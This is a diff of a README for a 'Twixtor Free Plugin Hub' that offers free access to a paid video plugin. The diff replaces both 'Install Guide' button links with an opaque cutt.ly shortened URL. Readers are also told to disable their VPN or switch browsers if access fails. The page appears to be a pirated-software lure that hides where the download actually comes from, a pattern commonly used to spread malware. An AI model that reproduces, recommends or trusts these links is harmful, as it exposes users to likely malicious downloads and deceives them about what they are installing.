@@ -5,7 +5,7 @@
 
 **Description**: Enhance your video editing with the **Twixtor Free Plugin Hub** in 2025! This repository offers exclusive tutorials, resources, and tips to explore features like smooth slow-motion and frame rate conversion. Get started with free plugin access and join our creative community of video editors!  
 
-<a href="https://twixtor-plugin-for-free-2025.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/yrNtiq3S" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -29,7 +29,7 @@ Unlock Twixtor’s power with these simple steps to set up the free plugin! 🛠
 5. **Access Problems?** 🌐  
    If the package access fails, try disabling your VPN or switching browsers (e.g., Chrome, Firefox).  
 
-<a href="https://twixtor-plugin-for-free-2025.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/yrNtiq3S" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
